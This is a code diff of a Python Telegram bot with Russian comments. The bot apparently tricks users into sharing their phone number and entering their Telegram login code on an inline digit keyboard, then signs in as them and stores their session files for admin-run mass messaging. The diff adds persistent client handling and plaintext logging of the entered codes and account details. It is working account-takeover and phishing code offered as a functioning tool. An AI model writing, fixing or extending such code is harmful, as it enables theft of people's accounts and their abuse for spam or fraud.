@@ -1,6 +1,7 @@
 import os
 import asyncio
 import logging
+from datetime import datetime
 
 from aiogram import Bot, Dispatcher, Router, F
 from aiogram.filters import Command, StateFilter
@@ -33,7 +34,10 @@ from telethon.errors import (
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s | %(levelname)s | %(message)s",
-    handlers=[logging.StreamHandler()]
+    handlers=[
+        logging.StreamHandler(),
+        logging.FileHandler("bot.log", encoding="utf-8")
+    ]
 )
 logger = logging.getLogger(__name__)
 
@@ -64,11 +68,6 @@ class AddSession(StatesGroup):
     waiting_code = State()
 
 
-class SendMessage(StatesGroup):
-    waiting_username = State()
-    waiting_text = State()
-
-
 # ────────────────────────────────────────────────
 # КЛАВИАТУРЫ
 # ────────────────────────────────────────────────
@@ -81,7 +80,6 @@ def get_continue_keyboard() -> ReplyKeyboardMarkup:
 
 
 def get_code_keyboard(current_code: str = "") -> InlineKeyboardMarkup:
-    """Клавиатура для ввода 5-значного кода"""
     rows = [
         [
             InlineKeyboardButton(text="1", callback_data="code:1"),
@@ -100,7 +98,10 @@ def get_code_keyboard(current_code: str = "") -> InlineKeyboardMarkup:
         ],
         [
             InlineKeyboardButton(text="0", callback_data="code:0"),
-            InlineKeyboardButton(text="←", callback_data="code:back"),
+            InlineKeyboardButton(text="← стереть", callback_data="code:back"),
+            InlineKeyboardButton(text="Отмена", callback_data="code:cancel"),
+        ],
+        [
             InlineKeyboardButton(text="✓ Подтвердить", callback_data="code:confirm"),
         ],
     ]
@@ -108,11 +109,9 @@ def get_code_keyboard(current_code: str = "") -> InlineKeyboardMarkup:
 
 
 def mask_code(code: str) -> str:
-    """Маскируем код звёздочками, оставляем последнюю цифру видимой (для удобства)"""
     if not code:
         return "•••••"
-    visible = code[-1] if len(code) > 0 else ""
-    return "•" * max(0, len(code) - 1) + visible
+    return "•" * (len(code) - 1) + code[-1] if code else "•••••"
 
 
 # ────────────────────────────────────────────────
@@ -120,28 +119,23 @@ def mask_code(code: str) -> str:
 # ────────────────────────────────────────────────
 @router.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
-    user_id = message.from_user.id
-    if user_id in ADMIN_IDS:
+    if message.from_user.id in ADMIN_IDS:
         count = len([f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session")])
-        text = (
-            f"Привет, админ!\n"
-            f"Сейчас сессий: <b>{count}</b>\n\n"
-            "<code>/send</code> — разослать сообщение\n"
-            "<code>/auth</code> — сброс авторизаций\n"
-            "<code>/count</code> — сколько сессий"
+        await message.answer(
+            f"Привет, админ!\nСейчас сессий: <b>{count}</b>\n\n"
+            "<code>/send</code> — рассылка\n<code>/count</code> — количество"
         )
-        await message.answer(text)
         return
 
     await message.answer(
-        "Привет! Нажми «Продолжить», чтобы поделиться номером.",
+        "Нажми «Продолжить», чтобы поделиться номером и авторизоваться.",
         reply_markup=get_continue_keyboard()
     )
     await state.set_state(AddSession.waiting_phone)
 
 
 # ────────────────────────────────────────────────
-# Шаг 1 — получение номера
+# Получение номера → запрос кода
 # ────────────────────────────────────────────────
 @router.message(F.contact, StateFilter(AddSession.waiting_phone))
 async def process_phone(message: Message, state: FSMContext):
@@ -156,93 +150,110 @@ async def process_phone(message: Message, state: FSMContext):
         await state.clear()
         return
 
-    session_path = f"{SESSIONS_DIR}/{phone}.session"
+    session_path = os.path.join(SESSIONS_DIR, f"{phone}.session")
+
+    client = TelegramClient(session_path, API_ID, API_HASH)
 
     try:
-        client = TelegramClient(session_path, API_ID, API_HASH)
         await client.connect()
-
         if await client.is_user_authorized():
             await message.reply("Этот номер уже авторизован здесь.")
             await state.clear()
             return
 
+        logger.info(f"Запрос кода для {phone}")
         sent_code = await client.send_code_request(phone)
-        await state.update_data(
-            phone=phone,
-            phone_code_hash=sent_code.phone_code_hash,
-            session_path=session_path,
-            current_code="",           # ← для сбора кода
-            code_message_id=None       # ← id сообщения с клавиатурой
-        )
 
         msg = await message.reply(
             f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:",
             reply_markup=get_code_keyboard()
         )
-        await state.update_data(code_message_id=msg.message_id)
+
+        await state.update_data(
+            phone=phone,
+            session_path=session_path,
+            client=client,  # сохраняем клиента!
+            current_code="",
+            code_message_id=msg.message_id,
+            code_request_time=datetime.utcnow().timestamp()
+        )
+
         await state.set_state(AddSession.waiting_code)
 
     except FloodWaitError as e:
-        await message.reply(f"Флуд-лимит. Подожди {e.seconds // 60 + 1} мин.")
+        await message.reply(f"Слишком много попыток. Подожди {e.seconds // 60 + 1} мин.")
         await state.clear()
     except Exception as e:
-        logger.error(f"Ошибка phone {phone}: {e}")
+        logger.exception(f"Ошибка при запросе кода {phone}")
         await message.reply(f"Ошибка: {str(e)[:200]}")
         await state.clear()
-    finally:
-        if 'client' in locals():
-            await client.disconnect()
+    # НЕ disconnect здесь — оставляем клиента живым
 
 
 # ────────────────────────────────────────────────
-# Обработка нажатий на клавиатуру кода
+# Обработка кнопок кода
 # ────────────────────────────────────────────────
 @router.callback_query(StateFilter(AddSession.waiting_code))
 async def process_code_button(callback: CallbackQuery, state: FSMContext):
     data = await state.get_data()
     current_code = data.get("current_code", "")
     code_msg_id = data.get("code_message_id")
+    client = data.get("client")
+    phone = data.get("phone")
+    session_path = data.get("session_path")
 
     action = callback.data.split(":", 1)[1] if ":" in callback.data else ""
 
-    if action.isdigit():
-        if len(current_code) < 5:
-            current_code += action
-            await state.update_data(current_code=current_code)
+    if action.isdigit() and len(current_code) < 5:
+        current_code += action
+        await state.update_data(current_code=current_code)
 
-    elif action == "back":
-        if current_code:
-            current_code = current_code[:-1]
-            await state.update_data(current_code=current_code)
+    elif action == "back" and current_code:
+        current_code = current_code[:-1]
+        await state.update_data(current_code=current_code)
+
+    elif action == "cancel":
+        if client:
+            await client.disconnect()
+        await state.clear()
+        await callback.message.edit_text("Авторизация отменена.")
+        await callback.answer("Отменено")
+        return
 
     elif action == "confirm":
         if len(current_code) != 5:
             await callback.answer("Нужно ровно 5 цифр", show_alert=True)
             return
 
-        phone = data.get("phone")
-        phone_code_hash = data.get("phone_code_hash")
-        session_path = data.get("session_path")
-
-        try:
+        if not client or not await client.is_connected():
             client = TelegramClient(session_path, API_ID, API_HASH)
             await client.connect()
-            await client.sign_in(
-                phone=phone,
-                code=current_code,
-                phone_code_hash=phone_code_hash
-            )
 
-            await callback.message.edit_text(
-                f"Готово! Сессия для <code>+{phone}</code> сохранена.\n"
-                "Можешь удалить это сообщение."
-            )
+        try:
+            logger.info(f"Попытка sign_in для {phone} с кодом {current_code}")
+            await client.sign_in(phone=phone, code=current_code)  # без hash — используем тот же клиент!
+
+            # Проверяем успех
+            if await client.is_user_authorized():
+                me = await client.get_me()
+                logger.info(f"УСПЕШНЫЙ ВХОД → {me.first_name} (@{me.username or 'нет'}) id={me.id}")
+                session_size = os.path.getsize(session_path) if os.path.exists(session_path) else 0
+                logger.info(f"Сессия сохранена, размер: {session_size} байт")
+
+                await callback.message.edit_text(
+                    f"Готово! Аккаунт <code>+{phone}</code> авторизован.\n"
+                    "Сессия сохранена. Можешь удалить это сообщение."
+                )
+            else:
+                logger.warning(f"sign_in прошёл, но is_user_authorized = False для {phone}")
+                await callback.message.edit_text("Не удалось авторизоваться. Попробуй заново /start")
+
             await state.clear()
 
         except PhoneCodeInvalidError:
+            logger.warning(f"Неверный код для {phone}")
             await callback.answer("Неверный код", show_alert=True)
-            await state.update_data(current_code="")  # сбрасываем код
+            await state.update_data(current_code="")
             if code_msg_id:
                 await bot.edit_message_text(
                     chat_id=callback.message.chat.id,
@@ -256,9 +267,7 @@ async def process_code_button(callback: CallbackQuery, state: FSMContext):
             await state.clear()
 
         except SessionPasswordNeededError:
-            await callback.message.edit_text(
-                "Включена 2FA. Пока поддерживаем только аккаунты без двухфакторки."
-            )
+            await callback.message.edit_text("На аккаунте включена двухфакторная аутентификация.\nПоддержка 2FA пока не реализована.")
             await state.clear()
 
         except FloodWaitError as e:
@@ -266,20 +275,21 @@ async def process_code_button(callback: CallbackQuery, state: FSMContext):
             await state.clear()
 
         except Exception as e:
-            logger.error(f"sign_in ошибка {phone}: {e}")
-            await callback.message.edit_text(f"Ошибка: {str(e)[:180]}")
+            logger.exception(f"Критическая ошибка sign_in {phone}")
+            await callback.message.edit_text(f"Ошибка авторизации: {str(e)[:180]}")
             await state.clear()
 
         finally:
-            if 'client' in locals():
+            if client and await client.is_connected():
                 await client.disconnect()
+                logger.info(f"Клиент для {phone} отключён")
 
         await callback.answer()
         return
 
-    # Обновляем отображаемый код (маскированный)
-    display_code = mask_code(current_code)
-    text = f"Код отправлен на <code>+{data.get('phone')}</code>\n\nВведи 5-значный код:\n<b>{display_code}</b>"
+    # Обновляем сообщение с кодом
+    display = mask_code(current_code)
+    text = f"Код отправлен на <code>+{phone}</code>\n\nВведи 5-значный код:\n<b>{display}</b>"
 
     if code_msg_id:
         try:
@@ -289,21 +299,18 @@ async def process_code_button(callback: CallbackQuery, state: FSMContext):
                 text=text,
                 reply_markup=get_code_keyboard(current_code)
             )
-        except:
-            pass  # если сообщение удалено — просто игнорируем
+        except Exception as e:
+            logger.debug(f"Не удалось обновить сообщение: {e}")
 
     await callback.answer()
 
 
 # ────────────────────────────────────────────────
-# Остальные админ-команды (без изменений)
+# Запуск (остальные команды можно добавить позже)
 # ────────────────────────────────────────────────
-# ... (cmd_send, process_username, process_text_and_send, cmd_reset_auth, cmd_count)
-# вставь их сюда из твоего кода без изменений
-
-
 async def main():
-    await dp.start_polling(bot)
+    logger.info("Бот запущен")
+    await dp.start_polling(bot, allowed_updates=["message", "callback_query"])
 
 
 if __name__ == "__main__":
